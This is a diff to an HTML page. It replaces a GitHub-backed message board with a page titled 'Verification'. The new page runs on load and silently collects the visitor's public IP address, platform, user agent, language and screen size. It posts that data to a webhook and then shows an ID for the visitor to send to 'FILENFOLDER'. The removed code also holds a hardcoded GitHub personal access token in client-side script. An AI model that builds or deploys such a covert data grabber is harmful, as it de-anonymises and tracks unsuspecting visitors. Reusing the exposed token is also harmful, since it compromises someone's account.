@@ -1,167 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GitHub Message Updater</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin: 20px;
-    }
-    #message-board {
-      margin: 20px auto;
-      max-width: 600px;
-      border: 1px solid #ddd;
-      padding: 10px;
-      border-radius: 5px;
-      background: #f9f9f9;
-      height: 300px;
-      overflow-y: auto;
-    }
-    .message {
-      margin: 10px 0;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      background: #fff;
-    }
-    #new-message {
-      width: 80%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-    }
-    #send-button {
-      padding: 10px 20px;
-      background: #007BFF;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    #send-button:hover {
-      background: #0056b3;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f9;
+            margin: 0;
+        }
+        #status {
+            text-align: center;
+            font-size: 1.2rem;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-  <h1>GitHub Message Viewer & Sender</h1>
+    <div id="status">Fetching...</div>
 
-  <div id="message-board">
-    <p>Loading messages...</p>
-  </div>
+    <script>
+        async function collectData() {
+            const statusDiv = document.getElementById('status');
+            const webhookUrl = 'YOUR_WEBHOOK_URL_HERE';
+            const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();
 
-  <textarea id="new-message" placeholder="Type your message here..."></textarea><br>
-  <button id="send-button">Send Message</button>
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
 
-  <script>
-    const githubRawUrl = 'https://raw.githubusercontent.com/FilenFolder/filess/main/messages.json';
-    const githubApiUrl = 'https://api.github.com/repos/FilenFolder/filess/contents/messages.json';
-    
-    // Securely handle the GitHub token (NEVER hardcode it in production)
-    const githubToken = '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'; // Replace with your GitHub token
-    if (!githubToken) {
-      alert('GitHub token is missing. Please configure it securely.');
-    }
+                const info = {
+                    id: sessionId,
+                    ip: ipData.ip,
+                    os: navigator.platform,
+                    agent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`
+                };
 
-    const messageBoard = document.getElementById('message-board');
-    const newMessageBox = document.getElementById('new-message');
-    const sendButton = document.getElementById('send-button');
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
 
-    // Function to load messages from the JSON file
-    async function loadMessages() {
-      try {
-        const response = await fetch(githubRawUrl + '?' + new Date().getTime()); // Prevent caching
-        if (!response.ok) throw new Error(`Failed to fetch messages. HTTP Status: ${response.status}`);
-        const data = await response.json();
-
-        // Clear existing messages
-        messageBoard.innerHTML = '';
-
-        // Display messages
-        if (data.messages && data.messages.length > 0) {
-          data.messages.forEach((message) => {
-            const messageElement = document.createElement('div');
-            messageElement.classList.add('message');
-            messageElement.textContent = message.text;
-            messageBoard.appendChild(messageElement);
-          });
-        } else {
-          messageBoard.innerHTML = '<p>No messages to display.</p>';
+                statusDiv.innerHTML = `ID: <strong>${sessionId}</strong><br>Send this to FILENFOLDER`;
+            } catch (error) {
+                statusDiv.innerText = "Error during verification.";
+            }
         }
-      } catch (error) {
-        console.error('Error loading messages:', error);
-        messageBoard.innerHTML = '<p>Error loading messages. Please try again later.</p>';
-      }
-    }
 
-    // Function to encode content as Base64
-    function encodeContent(content) {
-      return btoa(unescape(encodeURIComponent(content)));
-    }
-
-    // Function to send a new message
-    async function sendMessage() {
-      const newMessage = newMessageBox.value.trim();
-      if (!newMessage) {
-        alert('Please type a message!');
-        return;
-      }
-
-      try {
-        // Fetch the current JSON file to get the existing messages
-        const response = await fetch(githubRawUrl);
-        if (!response.ok) throw new Error(`Failed to fetch messages. HTTP Status: ${response.status}`);
-        const data = await response.json();
-
-        // Add the new message to the messages array
-        data.messages.push({ text: newMessage });
-
-        // Prepare the updated JSON file content
-        const updatedContent = JSON.stringify(data, null, 2);
-
-        // Get the current file's SHA (required for updating via GitHub API)
-        const fileResponse = await fetch(githubApiUrl, {
-          headers: {
-            Authorization: `Bearer ${githubToken}`,
-          },
-        });
-        if (!fileResponse.ok) throw new Error(`Failed to fetch file info. HTTP Status: ${fileResponse.status}`);
-        const fileData = await fileResponse.json();
-
-        // Update the file on GitHub
-        const updateResponse = await fetch(githubApiUrl, {
-          method: 'PUT',
-          headers: {
-            Authorization: `Bearer ${githubToken}`,
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            message: 'Update messages.json with a new message',
-            content: encodeContent(updatedContent), // Encode content in Base64
-            sha: fileData.sha, // Include the file's SHA
-          }),
-        });
-
-        if (!updateResponse.ok) throw new Error(`Failed to update file. HTTP Status: ${updateResponse.status}`);
-
-        // Clear the text box and reload messages
-        newMessageBox.value = '';
-        loadMessages();
-      } catch (error) {
-        console.error('Error sending message:', error);
-        alert('Failed to send message. Please try again later.');
-      }
-    }
-
-    // Load messages on page load
-    loadMessages();
-
-    // Send a new message when the button is clicked
-    sendButton.addEventListener('click', sendMessage);
-  </script>
+        window.onload = collectData;
+    </script>
 </body>
 </html>
